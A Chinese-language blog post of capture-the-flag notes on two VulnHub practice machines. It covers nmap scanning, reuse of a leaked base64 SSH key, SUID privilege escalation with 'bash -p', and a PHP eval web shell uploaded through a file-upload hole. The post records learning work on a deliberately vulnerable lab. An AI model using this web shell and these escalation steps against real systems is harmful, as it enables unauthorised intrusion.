---

title: vulnhub study

date: 2025-04-08 10:00:00 +0800

categories: NetworkSecurity

tags: [network security]

pin: true

---
# vulnhub刷题笔记

### oscp

靶机：下载后直接用vmware打开

![image-20250409191810666](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409191810666.png)

攻击机：kali机

#### 1. 获取信息

**扫网段**：`nmap -sP 192.168.157.0/24`，用自带的nmap扫描网段信息，-sP相当于发送ICMP协议，用于测试该网段下主机、路由器是否可达。

![image-20250409192307074](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409192307074.png)

**扫端口**：`nmap -A -sV -T4 -p1-65535 IP地址`，-A是全面扫描，-sV是返回版本号，-T4是扫描速度（0-5）

![image-20250409205231695](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409205231695.png)  

可以看到，开放了22、80、33060端口

**扫目录**：开放了80端口，我们可以看出开启了http服务，那可以用dirb、dirsearch、御剑去扫目录，值得注意的是**dirb需要加上http**，可以看到有robots.txt

![image-20250409205602838](C:/Users/Beamice/AppData/Roaming/Typora/typora-user-images/image-20250409205602838.png)

**网页信息收集：**打开txt后发现有隐藏txt文件，打开后其实是base64编码后的内容

![image-20250409210247613](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409210247613.png)

![image-20250409205713601](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409205713601.png)

![image-20250409205816980](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409205816980.png)

#### 2.漏洞利用

通过base64解码，我们可以发现其实是openssh的秘钥，那么在结合网页内容的提示，我们可以用ssh远程登录web服务器，将秘钥写成文件，命名为openssh/id_rsa，vim直接新建文件，在这里我发现vim的全部删除指令，**全部删除：按esc后，然后dG** [vim的快捷键参考](https://blog.csdn.net/ztf312/article/details/83025297)

![image-20250409205855401](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409205855401.png)

然后我们用如下命令连接ssh：`ssh -i openssh oscp@192.163.157.130 `进行远程登录 ，其实permission deny了，看了一下writeup，主要是权限不对，得chmod 600至于为什么不是很清楚啊

![image-20250409210959106](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409210959106.png)

#### 3.提权

进入成功后，id/whoami/pwd，查看后发现只是普通用户，是无法进入/root目录下找到flag，那么应该怎么办？之前面经背过suid提权，感觉是可以尝试。suid提权是程序如果有suid权限，那么用户在调用程序的时候，实际程序的进程属主不是用户，而是程序文件的属主，包括bash、awk、nmap、find、more、less[suid提权详解](https://www.freebuf.com/articles/web/272617.html)

用如下命令可以查看系统上运行的所有SUID可执行文件

`find / -user root -perm -4000 -print 2>/dev/null`

![image-20250409211835412](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409211835412.png)

有bash，那么可以bash -p打开一个bash shell，结果就是成功提权啦~

![image-20250409211643633](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250409211643633.png)

### JIS

有五个flag可以找

#### 1. 准备工作

其实一开始打开vmware后是没有IP的，这个需要我们来进行网络配置。vmware的配置如下：

靶机的账号口令为： technawi/3vilH@ksor
vmware打开虚拟机后登录然后更改root用户的密码`sudo passwd root` ,然后输入密码3vilH@ksor，根据提示重置root用户的密码，进入超级用户后，执行下面命令

```bash
ifconfig ens33 up //启用网卡，然后再通过 ifconfig -a 看，发现 没有IP

dhclient ens33  // 分配IP
```

#### 2.信息收集

**扫网段：**主机的IP为192.168.157.131，所在网段为192.168.157.0/24,先用nmap扫一下是否能扫到该主机

`nmap -sP 192.168.157.0/24`

![image-20250410152153342](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410152153342.png)

**扫端口：**`nmap -A -sV -T4 -p1-65535 192.168.157.131`，可以看出80端口的http服务是开着的

#### 3.漏洞利用

**Flag one：**有一个flag的目录，直接访问flag，拿到第一个flag

![image-20250410152415871](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410152415871.png)

![image-20250410152537484](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410152537484.png)

**Flag Two**：可以看到还有一个admin_area，进行访问，查看网页源代码，可以看到第二个flag，以及账号密码：admin；3v1l_H@ck3r

![image-20250410152730229](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410152730229.png)

**Flag Three**：访问192.168.157.131，跳转到登录界面，尝试用刚才那个账号密码，没想到可以！

![image-20250410153218058](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410153218058.png)

这个就是典型的文件上传漏洞，可以尝试一句话木马上传，但这里需要注意的是，文件的路径在哪里呢？点击upload file没有回显路径，那么应该怎么办呢？刚好刚才在信息收集部分，其实可以看到扫出来了一个目录uploaded_files，可以尝试一下

编写一句话木马，上传到服务器

`<?php @eval($_POST['cmd'])?>`，蚁剑连接登录上去了，在`/var/www/html/hint.txt`目录下看到了第三个flag![image-20250410161023306](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410161023306.png)

**Flag Four**：上文有了提示，通过用户technawi去读取flag文件

`find /-user 'technawi' 2>/dev/null`，顺利找到第四个flag![image-20250410161617494](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410161617494.png)

![image-20250410161708324](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410161708324.png)

**Flag Five：**第四个flag其实是有意引导我们去搜索，credentials的意思是证书，那么其实可以联想到用ssh去连接主机，再去看flag.txt(结合flag3的提示)，那么我们可以尝试，成功拿到第五个flag

![image-20250410162625001](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250410162625001.png)

总结：其实我们可以看到通过文件上传去访问的是拿不到flag.txt，可能是因为权限不够，所以用ssh连接上去后flag.txt的内容就一览无余啦~

